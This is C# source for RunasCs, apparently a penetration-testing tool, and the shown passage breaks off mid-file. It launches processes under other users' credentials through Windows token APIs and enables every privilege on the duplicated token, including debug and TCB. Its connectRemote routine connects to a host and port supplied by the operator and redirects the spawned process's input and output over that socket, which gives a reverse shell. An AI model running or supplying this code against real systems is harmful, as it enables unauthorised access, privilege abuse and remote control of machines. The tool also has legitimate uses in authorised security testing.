using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Sockets;

namespace Runas {

public class RunasCsException : Exception
{
    private const string error_string = "[-] RunasCsException: ";

    public RunasCsException(){}

    public RunasCsException(string message) : base(error_string + message){}
}

public class RunasCs
{
    private const UInt16 SW_HIDE = 0;
    private const Int32 Startf_UseStdHandles = 0x00000100;
    private const int TokenType = 1; //primary token
    private const int LOGON32_PROVIDER_DEFAULT = 0; 
    private const int LOGON32_PROVIDER_WINNT50 = 3;
    private const int BUFFER_SIZE_PIPE = 1048576;
    private const uint CREATE_NO_WINDOW = 0x08000000;
    private const uint GENERIC_ALL = 0x10000000;
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
    private const UInt32 LOGON_WITH_PROFILE = 1;
    private const UInt32 LOGON_NETCREDENTIALS_ONLY = 2;

    private IntPtr socket;
    private IntPtr hErrorWrite;
    private IntPtr hOutputRead;
    private IntPtr hOutputWrite;
    private IntPtr hOutputReadTmp;
    private WindowStationDACL stationDaclObj;

    public RunasCs()
    {
        this.hOutputReadTmp = new IntPtr(0);
        this.hOutputRead = new IntPtr(0);
        this.hOutputWrite = new IntPtr(0);
        this.hErrorWrite = new IntPtr(0);
        this.socket = new IntPtr(0);
        this.stationDaclObj = null;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID 
    {
       public UInt32 LowPart;
       public Int32 HighPart;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    private struct LUID_AND_ATTRIBUTES 
    {
       public LUID Luid;
       public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public UInt32 PrivilegeCount;
        public LUID Luid;
        public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
         public Int32 cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
         public Int32 dwX;
         public Int32 dwY;
         public Int32 dwXSize;
         public Int32 dwYSize;
         public Int32 dwXCountChars;
         public Int32 dwYCountChars;
         public Int32 dwFillAttribute;
         public Int32 dwFlags;
         public Int16 wShowWindow;
         public Int16 cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
         public IntPtr hStdError;
    }

    private struct ProcessInformation
    {
        public IntPtr process;
        public IntPtr thread;
        public int    processId;
        public int    threadId;
    }
    
    [StructLayout(LayoutKind.Sequential)] 
    private struct SECURITY_ATTRIBUTES
    {
        public int    Length;
        public IntPtr lpSecurityDescriptor;
        public bool   bInheritHandle;
    }
    
    private enum SECURITY_IMPERSONATION_LEVEL 
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAData
    {
        internal short wVersion;
        internal short wHighVersion;
        internal short iMaxSockets;
        internal short iMaxUdpDg;
        internal IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        internal string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        internal string szSystemStatus;
    }

    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern bool CloseHandle(IntPtr handle);
    
    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)]ref TOKEN_PRIVILEGES Newstate, int bufferlength, int PreivousState, int Returnlength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);
    
    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken);
    
    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessAsUser(IntPtr hToken,string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,ref STARTUPINFO lpStartupInfo,out ProcessInformation lpProcessInformation);  

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll")]
    static extern bool SetNamedPipeHandleState(IntPtr hNamedPipe, ref UInt32 lpMode, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("userenv.dll", SetLastError=true)]
    static extern bool CreateEnvironmentBlock( out IntPtr lpEnvironment, IntPtr hToken, bool bInherit );

    [DllImport("userenv.dll", SetLastError=true)]
    static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

    [DllImport("userenv.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort hostshort);

    [Obsolete]
    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
    static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int closesocket(IntPtr s);
    
    private static string GetProcessFunction(int createProcessFunction){
        if(createProcessFunction == 0)
            return "CreateProcessAsUser()";
        if(createProcessFunction == 1)
            return "CreateProcessWithTokenW()";
        return "CreateProcessWithLogonW()";
    }
    
    private static string EnablePrivilege(string privilege, IntPtr token){
        string output = "";
        LUID sebLuid = new LUID();
        TOKEN_PRIVILEGES tokenp = new TOKEN_PRIVILEGES();
        tokenp.PrivilegeCount = 1;
        LookupPrivilegeValue(null, privilege, ref sebLuid);
        tokenp.Luid = sebLuid;
        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
        if(!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0)){
            throw new RunasCsException("AdjustTokenPrivileges on privilege " + privilege + " failed with error code: " + Marshal.GetLastWin32Error());
        }
        output += "\r\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
        return output;
    }
    
    public static string EnableAllPrivileges(IntPtr token)
    {
        string output="";
        output += EnablePrivilege("SeAssignPrimaryTokenPrivilege", token);
        output += EnablePrivilege("SeAuditPrivilege", token);
        output += EnablePrivilege("SeBackupPrivilege", token);
        output += EnablePrivilege("SeChangeNotifyPrivilege", token);
        output += EnablePrivilege("SeCreateGlobalPrivilege", token);
        output += EnablePrivilege("SeCreatePagefilePrivilege", token);
        output += EnablePrivilege("SeCreatePermanentPrivilege", token);
        output += EnablePrivilege("SeCreateSymbolicLinkPrivilege", token);
        output += EnablePrivilege("SeCreateTokenPrivilege", token);
        output += EnablePrivilege("SeDebugPrivilege", token);
        output += EnablePrivilege("SeDelegateSessionUserImpersonatePrivilege", token);
        output += EnablePrivilege("SeEnableDelegationPrivilege", token);
        output += EnablePrivilege("SeImpersonatePrivilege", token);
        output += EnablePrivilege("SeIncreaseBasePriorityPrivilege", token);
        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
        output += EnablePrivilege("SeIncreaseWorkingSetPrivilege", token);
        output += EnablePrivilege("SeLoadDriverPrivilege", token);
        output += EnablePrivilege("SeLockMemoryPrivilege", token);
        output += EnablePrivilege("SeMachineAccountPrivilege", token);
        output += EnablePrivilege("SeManageVolumePrivilege", token);
        output += EnablePrivilege("SeProfileSingleProcessPrivilege", token);
        output += EnablePrivilege("SeRelabelPrivilege", token);
        output += EnablePrivilege("SeRemoteShutdownPrivilege", token);
        output += EnablePrivilege("SeRestorePrivilege", token);
        output += EnablePrivilege("SeSecurityPrivilege", token);
        output += EnablePrivilege("SeShutdownPrivilege", token);
        output += EnablePrivilege("SeSyncAgentPrivilege", token);
        output += EnablePrivilege("SeSystemEnvironmentPrivilege", token);
        output += EnablePrivilege("SeSystemProfilePrivilege", token);
        output += EnablePrivilege("SeSystemtimePrivilege", token);
        output += EnablePrivilege("SeTakeOwnershipPrivilege", token);
        output += EnablePrivilege("SeTcbPrivilege", token);
        output += EnablePrivilege("SeTimeZonePrivilege", token);
        output += EnablePrivilege("SeTrustedCredManAccessPrivilege", token);
        output += EnablePrivilege("SeUndockPrivilege", token);
        output += EnablePrivilege("SeUnsolicitedInputPrivilege", token);
        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
        return output;
    }
    
    private static bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
    {
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = IntPtr.Zero;
        sa.bInheritHandle = true;
        if (CreatePipe(out hReadPipe, out hWritePipe, ref sa, (uint)BUFFER_SIZE_PIPE))
            return true;
        return false;
    }
    
    private static string ReadOutputFromPipe(IntPtr hReadPipe)
    {
        string output = "";
        uint dwBytesRead = 0;
        byte[] buffer = new byte[BUFFER_SIZE_PIPE];
        if(!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){
            output += "\r\nNo output received from the process.\r\n";
        }
        output += Encoding.Default.GetString(buffer, 0, (int)dwBytesRead);
        return output;
    }

    private static IntPtr connectRemote(string[] remote)
    {
        int port = 0;
        int error = 0;
        string host = remote[0];

        try {
            port = Convert.ToInt32(remote[1]);
        } catch {
            throw new RunasCsException("Specified port is invalid: " + remote[1]);
        }

        WSAData data;
        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
            error = WSAGetLastError();
            throw new RunasCsException(String.Format("WSAStartup failed with error code: {0}", error));
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);

        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            throw new RunasCsException(String.Format("WSAConnect failed with error code: {0}", error));
        }

        return socket;
    }
    
    private static int CountMultiStringBytes(IntPtr unicodeStrIntPtr)
    {
    // EnvironmentBlock format: Unicode-Str\0Unicode-Str\0...Unicode-Str\0\0.
        int count = 0;
        if(unicodeStrIntPtr == IntPtr.Zero)
            return count;
        while (true)
        {
            string str = Marshal.PtrToStringUni(unicodeStrIntPtr);
            if (str.Length == 0)
                break;
            int stringLen = (str.Length + 1 /* char \0 */) * sizeof(char);
            count = count + stringLen;
            if(IntPtr.Size == 8)
                unicodeStrIntPtr = new IntPtr(unicodeStrIntPtr.ToInt64() + stringLen);
            else
                unicodeStrIntPtr = new IntPtr(unicodeStrIntPtr.ToInt32() + stringLen);
        }
        return count;
    }

    private static bool getUserEnvironmentBlock(IntPtr hToken, out IntPtr lpEnvironment, out string warning)
    {
        bool success;
        warning = "";
        lpEnvironment = new IntPtr(0);

        success = ImpersonateLoggedOnUser(hToken);
        if(success == false) {
            warning = "[*] Warning: ImpersonateLoggedOnUser failed with error code: " + Marshal.GetLastWin32Error();
            return false;
        }

        success = CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        if(success == false)
        {
            warning = "[*] Warning: lpEnvironment failed with error code: " + Marshal.GetLastWin32Error() + ".\n";
            RevertToSelf();
            return false;
        }
                
        // obtain USERPROFILE value
        int dwSize = 0;
        GetUserProfileDirectory(hToken, null, ref dwSize);
        StringBuilder profileDir = new StringBuilder(dwSize);
        success = GetUserProfileDirectory(hToken, profileDir, ref dwSize);
        if(success == false)
        {
            warning = "[*] Warning: GetUserProfileDirectory failed with error code: " + Marshal.GetLastWin32Error();
            RevertToSelf();
            return false;
        }

        int count = CountMultiStringBytes(lpEnvironment);

        // copy raw environment to a managed array and free the unmanaged block
        byte[] managedArray = new byte[count];
        Marshal.Copy(lpEnvironment, managedArray, 0, count);
        DestroyEnvironmentBlock(lpEnvironment);

        string environmentString = Encoding.Unicode.GetString(managedArray);
        string[] envVariables = environmentString.Split((char)0x00);

        // Construct new user environment. Currently only USERPROFILE is replaced.
        // Other replacements could be inserted here.
        List<byte> newEnv = new List<byte>();
        foreach( string variable in envVariables ) {

            if( variable.StartsWith("USERPROFILE=") ) {
                newEnv.AddRange(Encoding.Unicode.GetBytes("USERPROFILE=" + profileDir.ToString() + "\u0000"));
            } else {
                newEnv.AddRange(Encoding.Unicode.GetBytes(variable + "\u0000"));
            }
        }

        // finalize EnvironmentBlock. Desired end: \0\0
        newEnv.Add(0x00);
        managedArray = newEnv.ToArray();
        lpEnvironment = Marshal.AllocHGlobal(managedArray.Length);
        Marshal.Copy(managedArray, 0, lpEnvironment, managedArray.Length);
    
        success = RevertToSelf();
        if(success == false)
        {
            warning = "[*] Warning: RevertToSelf failed with error code: " + Marshal.GetLastWin32Error();
            return false;
        }

        return true;
    }

    public void CleanupHandles()
    {
        if(this.hOutputReadTmp != IntPtr.Zero) CloseHandle(this.hOutputReadTmp);
        if(this.hOutputRead != IntPtr.Zero) CloseHandle(this.hOutputRead);
        if(this.hOutputWrite != IntPtr.Zero) CloseHandle(this.hOutputWrite);
        if(this.hErrorWrite != IntPtr.Zero) CloseHandle(this.hErrorWrite);
        if(this.socket != IntPtr.Zero) closesocket(this.socket);
        if(this.stationDaclObj != null) this.stationDaclObj.CleanupHandles();
        this.hOutputReadTmp = IntPtr.Zero;
        this.hOutputRead = IntPtr.Zero;
        this.hOutputWrite = IntPtr.Zero;
        this.hErrorWrite = IntPtr.Zero;
        this.socket = IntPtr.Zero;
        this.stationDaclObj = null;
    }

    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool createUserProfile)
    /*
        int createProcessFunction:
            0: CreateProcessAsUser();
            1: CreateProcessWithTokenW();
            2: CreateProcessWithLogonW();
    */
    {
        bool success;
        string output = "";
        string desktopName = "";
        string commandLine = cmd;
        string processPath = null;
        int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
        int logonFlags = (createUserProfile) ? (int)LOGON_WITH_PROFILE : 0;

        IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;

        STARTUPINFO startupInfo = new STARTUPINFO();
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpReserved = null;

        this.stationDaclObj = new WindowStationDACL();
        ProcessInformation processInfo = new ProcessInformation();

        if(processTimeout > 0) {
            if(!CreateAnonymousPipeEveryoneAccess(ref this.hOutputReadTmp, ref this.hOutputWrite)) {
                throw new RunasCsException("CreatePipe failed with error code: " + Marshal.GetLastWin32Error());
            }
            //1998's code. Old but gold https://support.microsoft.com/en-us/help/190351/how-to-spawn-console-processes-with-redirected-standard-handles
            if(!DuplicateHandle(hCurrentProcess, this.hOutputWrite, hCurrentProcess, out this.hErrorWrite, 0, true, DUPLICATE_SAME_ACCESS)) {
                throw new RunasCsException("DuplicateHandle stderr write pipe failed with error code: " + Marshal.GetLastWin32Error());
            }
            if(!DuplicateHandle(hCurrentProcess, this.hOutputReadTmp, hCurrentProcess, out this.hOutputRead, 0, false, DUPLICATE_SAME_ACCESS)) {
                throw new RunasCsException("DuplicateHandle stdout read pipe failed with error code: " + Marshal.GetLastWin32Error());
            }

            CloseHandle(this.hOutputReadTmp);
            UInt32 PIPE_NOWAIT = 0x00000001;
            if(!SetNamedPipeHandleState(this.hOutputRead, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero)) {
                throw new RunasCsException("SetNamedPipeHandleState failed with error code: " + Marshal.GetLastWin32Error());
            }

            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdOutput = this.hOutputWrite;
            startupInfo.hStdError = this.hErrorWrite;
            processPath = Environment.GetEnvironmentVariable("ComSpec");
            commandLine = "/c " + cmd;

        } else if( remote != null ) {
            this.socket = connectRemote(remote);
            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdInput = this.socket;
            startupInfo.hStdOutput = this.socket;
            startupInfo.hStdError = this.socket;
        }

        desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username);        
        startupInfo.lpDesktop = desktopName;

        if(createProcessFunction == 2){

            if(logonType == 9){
                if(domainName == "")
                    throw new RunasCsException("You must provide a domain name when using logon type 9 with CreateProcessWithLogonW.");
                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
            }
            else
                success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
            if (success == false){
                throw new RunasCsException("CreateProcessWithLogonW failed with " + Marshal.GetLastWin32Error());
            }

        } else {

            IntPtr hToken = new IntPtr(0);
            IntPtr hTokenDuplicate = new IntPtr(0);
            if(logonType == 9)
                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_WINNT50, ref hToken);
            else
                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
            if(success == false)
            {
                throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
            }

            SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
            sa.bInheritHandle       = true;
            sa.Length               = Marshal.SizeOf(sa);
            sa.lpSecurityDescriptor = (IntPtr)0;

            success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenType, ref hTokenDuplicate);
            if(success == false)
            {
                throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
            }

            // obtain environmentBlock for desired user
            string warning;
            IntPtr lpEnvironment;
            success = getUserEnvironmentBlock(hTokenDuplicate, out lpEnvironment, out warning);
            if(success == false) {
                Console.Out.WriteLine(warning);
                Console.Out.WriteLine(String.Format("[*] Warning: Unable to obtain environment for user '{0}'.", username));
                Console.Out.WriteLine(String.Format("[*] Warning: Environment of created process might be incorrect.", username));
            }

            //enable all privileges assigned to the token
            if(logonType != 3 && logonType != 8)
                EnableAllPrivileges(hTokenDuplicate);
                
            if(createProcessFunction == 0){
                //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
                success = CreateProcessAsUser(hTokenDuplicate, processPath, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
                if(success == false)
                {
                    throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
                }

            } else if(createProcessFunction == 1){

                success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, processPath, commandLine, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, null, ref startupInfo, out processInfo);
                if(success == false)
                {
                    throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
                }
            }

            if( lpEnvironment != IntPtr.Zero ) {
                DestroyEnvironmentBlock(lpEnvironment);
            }
            CloseHandle(hToken);
            CloseHandle(hTokenDuplicate);
        }

        if(processTimeout > 0) {
            CloseHandle(this.hOutputWrite);
            CloseHandle(this.hErrorWrite);
            WaitForSingleObject(processInfo.process, processTimeout);
            output += ReadOutputFromPipe(this.hOutputRead);

        } else {
            output += "[+] Running in session " + sessionId.ToString() + " with process function " + GetProcessFunction(createProcessFunction) + "\r\n";
            output += "[+] Using Station\\Desktop: " + desktopName + "\r\n";
            output += "[+] Async process '" + commandLine + "' with pid " + processInfo.processId + " created and left in background.\r\n";
        }

        CloseHandle(processInfo.process);
        CloseHandle(processInfo.thread);
        this.CleanupHandles();
        return output;
    }
}

public class WindowStationDACL{
   
    private const int UOI_NAME = 2;
    private const int SECURITY_WORLD_RID = 0;
    private const int ERROR_INSUFFICIENT_BUFFER = 122;
    private const uint SECURITY_DESCRIPTOR_REVISION = 1;
    private const uint ACL_REVISION = 2;
    private const uint MAXDWORD = 0xffffffff;
    private const byte ACCESS_ALLOWED_ACE_TYPE = 0x0;
    private const byte CONTAINER_INHERIT_ACE = 0x2;
    private const byte INHERIT_ONLY_ACE = 0x8;
    private const byte OBJECT_INHERIT_ACE = 0x1;
    private const byte NO_PROPAGATE_INHERIT_ACE = 0x4;
    private const int NO_ERROR = 0;
    private const int ERROR_INVALID_FLAGS = 1004; // On Windows Server 2003 this error is/can be returned, but processing can still continue
    
    [Flags]
    private enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,

        STANDARD_RIGHTS_REQUIRED = 0x000F0000,

        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,

        STANDARD_RIGHTS_ALL = 0x001F0000,

        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

        ACCESS_SYSTEM_SECURITY = 0x01000000,

        MAXIMUM_ALLOWED = 0x02000000,

        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        GENERIC_ACCESS = GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | GENERIC_ALL,

        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        DESKTOP_ALL = (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                    DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                    DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP |
                    STANDARD_RIGHTS_REQUIRED),

        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL =  (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | 
                   WINSTA_CREATEDESKTOP    | WINSTA_ENUMDESKTOPS      | 
                   WINSTA_ENUMERATE        | WINSTA_EXITWINDOWS       | 
                   WINSTA_READATTRIBUTES   | WINSTA_READSCREEN        | 
                   WINSTA_WRITEATTRIBUTES  | DELETE                   | 
                   READ_CONTROL            | WRITE_DAC                | 
                   WRITE_OWNER)
    }
    
    [Flags] 
    private enum SECURITY_INFORMATION : uint
    {
        OWNER_SECURITY_INFORMATION        = 0x00000001,
        GROUP_SECURITY_INFORMATION        = 0x00000002,
        DACL_SECURITY_INFORMATION         = 0x00000004,
        SACL_SECURITY_INFORMATION         = 0x00000008,
        UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
        UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
        PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000,
        PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
    }
    
    private enum ACL_INFORMATION_CLASS
    {
        AclRevisionInformation = 1,
        AclSizeInformation = 2
    }
    
    private enum SID_NAME_USE
    {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct SidIdentifierAuthority
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
        public byte[] Value;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACL_SIZE_INFORMATION
    {
        public uint AceCount;
        public uint AclBytesInUse;
        public uint AclBytesFree;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACE_HEADER
    {
        public byte AceType;
        public byte AceFlags;
        public short AceSize;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACCESS_ALLOWED_ACE
    {
        public ACE_HEADER Header;
        public ACCESS_MASK Mask;
        public uint SidStart;
    }
    
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetProcessWindowStation();

    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex,[Out] byte [] pvInfo, uint nLength, out uint lpnLengthNeeded);

    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta,[MarshalAs(UnmanagedType.Bool)]bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [DllImport("user32.dll")]
    private static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CloseWindowStation(IntPtr hWinsta);
    
    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool CloseDesktop(IntPtr hDesktop);
    
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetProcessWindowStation(IntPtr hWinSta);
 
    [DllImport("advapi32.dll")]
    private static extern IntPtr FreeSid(IntPtr pSid);
    
    [DllImport("user32.dll", SetLastError = true)]
